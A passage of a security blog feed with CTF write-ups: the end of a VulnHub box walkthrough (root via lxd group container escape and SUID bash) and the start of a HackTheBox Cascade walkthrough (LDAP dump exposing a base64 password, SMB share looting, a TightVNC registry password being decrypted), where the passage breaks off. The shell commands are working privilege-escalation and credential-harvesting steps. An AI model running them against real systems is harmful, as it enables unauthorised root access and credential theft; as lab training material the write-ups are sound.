&lt;p&gt;We just need to know what the user is. We continue to browse the website and
display the &lt;code&gt;admin&lt;/code&gt; user page (http://192.168.1.200/index.php/author/admin/) it
state that the only use on the box is &lt;code&gt;oscp&lt;/code&gt; so we connect on SSH as &lt;code&gt;oscp&lt;/code&gt; using
SSH key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh oscp@192.168.1.200 -i id_rsa &lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;I found two ways to get root. The first one (unintended) with &lt;code&gt;lxc&lt;/code&gt; and the
second one with an SUID binary.&lt;/p&gt;
&lt;h2 id="lxc"&gt;lxc&lt;/h2&gt;
&lt;p&gt;Once we have a shell on the box we run &lt;code&gt;id&lt;/code&gt; and found out that we are part of
the &lt;code&gt;lxd&lt;/code&gt; group. This is a know privilege escalation.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;~ # -bash-5.0$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When we try to run the &lt;code&gt;lxc&lt;/code&gt; (or &lt;code&gt;lxd&lt;/code&gt;) command we got an error &lt;code&gt;command not
found&lt;/code&gt; so we run a quick search in order to find the binary path.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ lxc&lt;/span&gt;
&lt;span class="code-line"&gt;-bash: lxc: command not found&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$ find / -name &amp;#39;lxc&amp;#39; 2&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/lxd/16100/bin/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/lxd/16100/commands/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/lxd/16100/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/lxd/16044/bin/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/lxd/16044/commands/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/lxd/16044/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/snap/bin/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/share/bash-completion/completions/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we build clone the alipne image and build it on our system (as it require
root permission), then we transfer it to the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ git clone https://github.com/saghul/lxd-alpine-builder&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ cd lxd-alpine-builder/&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~lxd-alpine-builder$ sudo ./build-alpine -a i686&lt;/span&gt;
&lt;span class="code-line"&gt;Determining the latest release... v3.12&lt;/span&gt;
&lt;span class="code-line"&gt;Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86&lt;/span&gt;
&lt;span class="code-line"&gt;Downloading alpine-keys-2.2-r0.apk&lt;/span&gt;
&lt;span class="code-line"&gt;tar: Ignoring unknown extended header keyword &amp;#39;APK-TOOLS.checksum.SHA1&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;18/19) Installing alpine-keys (2.2-r0)&lt;/span&gt;
&lt;span class="code-line"&gt;(19/19) Installing alpine-base (3.12.0-r0)&lt;/span&gt;
&lt;span class="code-line"&gt;Executing busybox-1.31.1-r19.trigger&lt;/span&gt;
&lt;span class="code-line"&gt;OK: 8 MiB in 19 packages&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~lxd-alpine-builder$ scp -i id_rsa alpine-v3.12-i686-20200717_0532.tar.gz oscp@192.168.1.200:&lt;/span&gt;
&lt;span class="code-line"&gt;alpine-v3.12-i686-20200717_0532.tar.gz&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we try to import the image in the box. We first need to initialize &lt;code&gt;lxd&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-i686-20200717_0532.tar.gz --alias myimage&lt;/span&gt;
&lt;span class="code-line"&gt;If this is your first time running LXD on this machine, you should also run: lxd init&lt;/span&gt;
&lt;span class="code-line"&gt;To start your first instance, try: lxc launch ubuntu:18.04&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Image imported with fingerprint: dcf00931e4bc5f738cb5d843593151420e4c27cf7c8152a3b91ec6c75bf4db6d&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;Error: No storage pool found. Please create a new storage pool&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxd init&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like to use LXD clustering? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;Do you want to configure a new storage pool? (yes/no) [default=yes]:&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Would you like a YAML &amp;quot;lxd init&amp;quot; preseed to be printed? (yes/no) [default=no]:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we just boot the image, mounting the host disk and access the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true&lt;/span&gt;
&lt;span class="code-line"&gt;Creating mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true&lt;/span&gt;
&lt;span class="code-line"&gt;Device mydevice added to mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc  start mycontainer&lt;/span&gt;
&lt;span class="code-line"&gt;-bash-5.0$ /snap/bin/lxc exec mycontainer /bin/sh&lt;/span&gt;
&lt;span class="code-line"&gt;~ # ls /mnt/root/&lt;/span&gt;
&lt;span class="code-line"&gt;bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var&lt;/span&gt;
&lt;span class="code-line"&gt;boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr&lt;/span&gt;
&lt;span class="code-line"&gt;~ # ls /mnt/root/root/&lt;/span&gt;
&lt;span class="code-line"&gt;fix-wordpress  flag.txt       snap&lt;/span&gt;
&lt;span class="code-line"&gt;~ # ls /mnt/root/root/flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;/mnt/root/root/flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;~ # cat /mnt/root/root/flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;d73b04b0e696b0945283defa3eee4538&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="suid-bash"&gt;SUID bash&lt;/h2&gt;
&lt;p&gt;We can also list the SUID binary and found that &lt;code&gt;/usr/bin/bash&lt;/code&gt; is SUID.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/pkexec&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We just use the &lt;code&gt;-p&lt;/code&gt; option in order to have a shell as root.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-bash-5.0$ bash -p&lt;/span&gt;
&lt;span class="code-line"&gt;bash-5.0# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)&lt;/span&gt;
&lt;span class="code-line"&gt;bash-5.0# cat /root/flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;d73b04b0e696b0945283defa3eee4538&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The box was really easy, a nice job from FalconSpy as it will allow "beginners"
to enter the give away.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="vulnhub"></category><category term="Linux"></category><category term="lxd"></category><category term="lxc"></category></entry><entry><title>HTB: Cascade</title><link href="https://maggick.fr/2020/07/htb-cascade.html" rel="alternate"></link><published>2020-07-26T09:30:00+02:00</published><updated>2020-07-26T09:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-26:/2020/07/htb-cascade.html</id><summary type="html">&lt;p&gt;&lt;img alt="Cascade Card" class="align-left" src="/media/2020.07/cascade_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/235"&gt;Cascade&lt;/a&gt; publish on
Mars 28 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
This box is rated as medium box. It implies some LDAP search, some SMB shares,
a VNC registry, some reverse engineering and the AD Recycle Bin.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/cascade_card.png" alt="Cascade Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/235"&gt;Cascade&lt;/a&gt; publish on
Mars 28 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
This box is rated as medium box. It implies some LDAP search, some SMB shares,
a VNC registry, some reverse engineering and the AD Recycle Bin.&lt;/p&gt;


&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
run a simple nmap scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Apr 10 05:54:33 2020 as: nmap -p- -sSV -oN nmap 10.10.10.182&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.182&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.084s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65520 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-10 09:59:25Z)&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;49154/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49155/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;49158/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49165/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Fri Apr 10 05:57:39 2020 -- 1 IP address (1 host up) scanned in 185.33 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As always with Windows box there is a lot of open ports and services.
We try to enumerate a few of them and run
&lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="ldap"&gt;LDAP&lt;/h2&gt;
&lt;p&gt;The interesting service is the LDAP. When enumerating and reading the result we
discover that the &lt;code&gt;r.thompson&lt;/code&gt; account as a filed &lt;code&gt;cascadeLegacyPwd&lt;/code&gt; containing
some base64 data.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ldapsearch -h 10.10.10.182 -p 389 -x -b &amp;quot;dc=cascade,dc=local&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Ryan Thompson, Users, UK, cascade.local&lt;/span&gt;
&lt;span class="code-line"&gt;dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;objectClass: top&lt;/span&gt;
&lt;span class="code-line"&gt;objectClass: person&lt;/span&gt;
&lt;span class="code-line"&gt;objectClass: organizationalPerson&lt;/span&gt;
&lt;span class="code-line"&gt;objectClass: user&lt;/span&gt;
&lt;span class="code-line"&gt;cn: Ryan Thompson&lt;/span&gt;
&lt;span class="code-line"&gt;sn: Thompson&lt;/span&gt;
&lt;span class="code-line"&gt;givenName: Ryan&lt;/span&gt;
&lt;span class="code-line"&gt;distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;instanceType: 4&lt;/span&gt;
&lt;span class="code-line"&gt;whenCreated: 20200109193126.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;whenChanged: 20200323112031.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;displayName: Ryan Thompson&lt;/span&gt;
&lt;span class="code-line"&gt;uSNCreated: 24610&lt;/span&gt;
&lt;span class="code-line"&gt;memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;uSNChanged: 295010&lt;/span&gt;
&lt;span class="code-line"&gt;name: Ryan Thompson&lt;/span&gt;
&lt;span class="code-line"&gt;objectGUID:: LfpD6qngUkupEy9bFXBBjA==&lt;/span&gt;
&lt;span class="code-line"&gt;userAccountControl: 66048&lt;/span&gt;
&lt;span class="code-line"&gt;badPwdCount: 1&lt;/span&gt;
&lt;span class="code-line"&gt;codePage: 0&lt;/span&gt;
&lt;span class="code-line"&gt;countryCode: 0&lt;/span&gt;
&lt;span class="code-line"&gt;badPasswordTime: 132309997863352844&lt;/span&gt;
&lt;span class="code-line"&gt;lastLogoff: 0&lt;/span&gt;
&lt;span class="code-line"&gt;lastLogon: 132247339125713230&lt;/span&gt;
&lt;span class="code-line"&gt;pwdLastSet: 132230718862636251&lt;/span&gt;
&lt;span class="code-line"&gt;primaryGroupID: 513&lt;/span&gt;
&lt;span class="code-line"&gt;objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==&lt;/span&gt;
&lt;span class="code-line"&gt;accountExpires: 9223372036854775807&lt;/span&gt;
&lt;span class="code-line"&gt;logonCount: 2&lt;/span&gt;
&lt;span class="code-line"&gt;sAMAccountName: r.thompson&lt;/span&gt;
&lt;span class="code-line"&gt;sAMAccountType: 805306368&lt;/span&gt;
&lt;span class="code-line"&gt;userPrincipalName: r.thompson@cascade.local&lt;/span&gt;
&lt;span class="code-line"&gt;objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData: 20200126183918.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData: 20200119174753.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData: 20200119174719.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData: 20200119174508.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;dSCorePropagationData: 16010101000000.0Z&lt;/span&gt;
&lt;span class="code-line"&gt;lastLogonTimestamp: 132294360317419816&lt;/span&gt;
&lt;span class="code-line"&gt;msDS-SupportedEncryptionTypes: 0&lt;/span&gt;
&lt;span class="code-line"&gt;cascadeLegacyPwd: clk0bjVldmE=&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We decode it and found the password &lt;code&gt;rY4n5eva&lt;/code&gt; for the &lt;code&gt;r.thompson&lt;/code&gt; account.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$  echo -ne &amp;#39;clk0bjVldmE=&amp;#39; | base64 -d&lt;/span&gt;
&lt;span class="code-line"&gt;rY4n5eva&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="smb-share"&gt;SMB share&lt;/h2&gt;
&lt;p&gt;Using this account we can enumerate the available SMB shares.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$  smbclient -L \\\\10.10.10.182 -U &amp;#39;r.thompson&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Unable to initialize messaging context&lt;/span&gt;
&lt;span class="code-line"&gt;Enter WORKGROUP\r.thompson&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        Sharename       Type      Comment&lt;/span&gt;
&lt;span class="code-line"&gt;        ---------       ----      -------&lt;/span&gt;
&lt;span class="code-line"&gt;        ADMIN$          Disk      Remote Admin&lt;/span&gt;
&lt;span class="code-line"&gt;        Audit$          Disk&lt;/span&gt;
&lt;span class="code-line"&gt;        C$              Disk      Default share&lt;/span&gt;
&lt;span class="code-line"&gt;        Data            Disk&lt;/span&gt;
&lt;span class="code-line"&gt;        IPC$            IPC       Remote IPC&lt;/span&gt;
&lt;span class="code-line"&gt;        NETLOGON        Disk      Logon server share&lt;/span&gt;
&lt;span class="code-line"&gt;        print$          Disk      Printer Drivers&lt;/span&gt;
&lt;span class="code-line"&gt;        SYSVOL          Disk      Logon server share&lt;/span&gt;
&lt;span class="code-line"&gt;SMB1 disabled -- no workgroup available&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We mount the &lt;code&gt;Data&lt;/code&gt; share using our account and list its content, the file &lt;code&gt;VNC
Install.reg&lt;/code&gt; inside &lt;code&gt;s.smith&lt;/code&gt; folder seems interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$  sudo mount //10.10.10.182/Data /mnt/ -o username=r.thompson&lt;/span&gt;
&lt;span class="code-line"&gt;tree /mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;/mnt/&lt;/span&gt;
&lt;span class="code-line"&gt;├── Contractors&lt;/span&gt;
&lt;span class="code-line"&gt;├── Finance&lt;/span&gt;
&lt;span class="code-line"&gt;├── IT&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── Email Archives&lt;/span&gt;
&lt;span class="code-line"&gt;│   │   └── Meeting_Notes_June_2018.html&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── LogonAudit&lt;/span&gt;
&lt;span class="code-line"&gt;│   ├── Logs&lt;/span&gt;
&lt;span class="code-line"&gt;│   │   ├── Ark AD Recycle Bin&lt;/span&gt;
&lt;span class="code-line"&gt;│   │   │   └── ArkAdRecycleBin.log&lt;/span&gt;
&lt;span class="code-line"&gt;│   │   └── DCs&lt;/span&gt;
&lt;span class="code-line"&gt;│   │       └── dcdiag.log&lt;/span&gt;
&lt;span class="code-line"&gt;│   └── Temp&lt;/span&gt;
&lt;span class="code-line"&gt;│       ├── r.thompson&lt;/span&gt;
&lt;span class="code-line"&gt;│       └── s.smith&lt;/span&gt;
&lt;span class="code-line"&gt;│           └── VNC Install.reg&lt;/span&gt;
&lt;span class="code-line"&gt;├── Production&lt;/span&gt;
&lt;span class="code-line"&gt;└── Temps&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;13 directories, 4 files&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This &lt;code&gt;VNC Install.reg&lt;/code&gt; file inside &lt;code&gt;s.smith&lt;/code&gt; folder is the Windows Registry of a VNC installation. The
&lt;code&gt;Password&lt;/code&gt; entry is really interesting.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ cat /mnt/IT/Temp/s.smith/VNC\ Install.reg&lt;/span&gt;
&lt;span class="code-line"&gt;��Windows Registry Editor Version 5.00&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;ExtraPorts&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;QueryTimeout&amp;quot;=dword:0000001e&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;QueryAcceptOnTimeout&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;LocalInputPriorityTimeout&amp;quot;=dword:00000003&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;LocalInputPriority&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;BlockRemoteInput&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;BlockLocalInput&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;IpAccessControl&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;RfbPort&amp;quot;=dword:0000170c&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;HttpPort&amp;quot;=dword:000016a8&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;DisconnectAction&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;AcceptRfbConnections&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;UseVncAuthentication&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;UseControlAuthentication&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;RepeatControlAuthentication&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;LoopbackOnly&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;AcceptHttpConnections&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;LogLevel&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;EnableFileTransfers&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;RemoveWallpaper&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;UseD3D&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;UseMirrorDriver&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;EnableUrlParams&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;Password&amp;quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;AlwaysShared&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;NeverShared&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;DisconnectClients&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;PollingInterval&amp;quot;=dword:000003e8&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;AllowLoopback&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;VideoRecognitionInterval&amp;quot;=dword:00000bb8&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;GrabTransparentWindows&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;SaveLogToAllUsersPath&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;RunControlInterface&amp;quot;=dword:00000001&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;IdleTimeout&amp;quot;=dword:00000000&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;VideoClasses&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;quot;VideoRects&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few Google search lead us to &lt;a href="https://github.com/frizb/PasswordDecrypts"&gt;github repository explaining how to decrypt the
password&lt;/a&gt; using the Interactive Ruby
Shell from metasploit.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ msfconsole&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 &amp;gt; irb&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Starting IRB shell...&lt;/span&gt;
